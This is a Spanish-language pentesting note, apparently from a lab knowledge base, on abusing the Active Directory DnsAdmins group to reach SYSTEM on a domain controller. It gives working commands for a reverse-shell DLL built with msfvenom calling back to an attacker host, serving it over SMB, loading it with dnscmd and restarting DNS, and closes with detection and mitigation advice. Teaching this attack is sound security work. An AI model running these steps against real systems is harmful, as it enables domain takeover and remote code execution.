---
title: Abuso del grupo DnsAdmins
resumen: Cargar una DLL maliciosa en el servicio DNS del DC para ejecutar código como NT AUTHORITY\SYSTEM.
tags: netexec, evil-winrm, impacket
dificultad: avanzado
---

## Definición

**DnsAdmins** es un grupo especial que tiene privilegios administrativos sobre el servicio DNS del dominio. Ser miembro de él (directamente o por pertenecer a un grupo anidado que a su vez pertenece a DnsAdmins) permite manipular la configuración del servicio DNS del controlador de dominio — en concreto, indicarle que cargue una **DLL arbitraria** como plugin propio (`ServerLevelPluginDll`). Como el servicio DNS en un DC corre con privilegios de `NT AUTHORITY\SYSTEM`, al pararlo y volverlo a arrancar (o esperar a que el DC se reinicie) esa DLL se ejecuta con esos mismos privilegios — convirtiendo la pertenencia a un grupo aparentemente inofensivo en una vía directa a SYSTEM en el controlador de dominio.

## Cuándo se usa

Cuando el usuario comprometido pertenece (directa o indirectamente) al grupo **DnsAdmins** y el dominio tiene el rol de **DNS Server** instalado en el DC — algo prácticamente obligatorio al crear un dominio, por lo que este grupo suele existir siempre, aunque no siempre tenga miembros añadidos por error.

## Requisitos previos

- Credenciales válidas de un usuario miembro de DnsAdmins (comprobable con `net user` / `net localgroup DnsAdmins`).
- Rol DNS Server activo en el DC.
- Forma de ejecutar comandos en el DC: lo más directo es que el usuario tenga también acceso remoto (por ejemplo, perteneciendo además a **Remote Management Users** para entrar por WinRM).
- **No** hace falta ser administrador local ni tener control sobre el Service Control Manager (SCM): `dnscmd.exe` valida la autorización directamente contra las ACLs del propio contenedor `MicrosoftDNS`, así que un miembro de DnsAdmins puede usarlo igualmente. `sc.exe` sí lo exige, y solo funciona si antes se modifica la cadena SDDL del servicio para dar permisos al grupo.

## Desarrollo del ataque

1. Confirmar que el usuario comprometido pertenece a DnsAdmins y validar las credenciales por SMB y WinRM.

```bash
nxc smb DC-01 -u 'dvazquez' -p '@DnsPower!2026'
nxc winrm DC-01 -u 'dvazquez' -p '@DnsPower!2026'
```

2. Conectarse al DC por WinRM.

```bash
evil-winrm -u dvazquez -p '@DnsPower!2026' -i 10.10.10.2
```

3. Generar una DLL maliciosa con una reverse shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -f dll -o pwned.dll
```

4. Levantar un recurso SMB propio que sirva esa DLL, y ponerse a la escucha.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
nc -nlvp 443
```

5. Indicarle al servicio DNS del DC que cargue esa DLL como plugin (vía `dnscmd.exe`, el binario nativo de administración DNS — ver [LOLBAS](https://lolbas-project.github.io/#dns)).

```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.10.5\smbFolder\pwned.dll
```

6. Forzar la ejecución de la DLL reiniciando el servicio DNS. Hay dos caminos, según los permisos disponibles:

```powershell
# Camino 1 — solo con dnscmd (siempre funciona para un miembro de DnsAdmins, sin tocar el SCM)
dnscmd.exe /restart
```

```powershell
# Camino 2 — con sc.exe (requiere haber dado antes permisos al grupo sobre el SCM vía SDDL)
sc.exe stop dns
sc.exe start dns
```

7. Si ninguno de los dos es viable de inmediato, también vale con esperar a que el DC se reinicie por cualquier otro motivo (mantenimiento, parcheo) — al arrancar de nuevo el servicio DNS, la DLL se ejecuta igualmente.
8. Recibir la shell como `NT AUTHORITY\SYSTEM` en el listener de `nc`.

## Herramientas relacionadas

- Ver [[netexec]] (validar credenciales por SMB/WinRM)
- Ver [[evil-winrm]] (conexión al DC)
- Ver [[impacket]] (smbserver, para servir la DLL)

## Detección y mitigación

Mantener el grupo DnsAdmins vacío salvo necesidad estricta y auditar su membresía periódicamente (incluyendo grupos anidados), monitorizar cambios en la clave de registro `HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`, y alertar sobre paradas/arranques del servicio DNS fuera de ventanas de mantenimiento conocidas. Referencia detallada del ataque: [Semperis — DnsAdmins Revisited](https://www.semperis.com/es/blog/dnsadmins-revisited/).
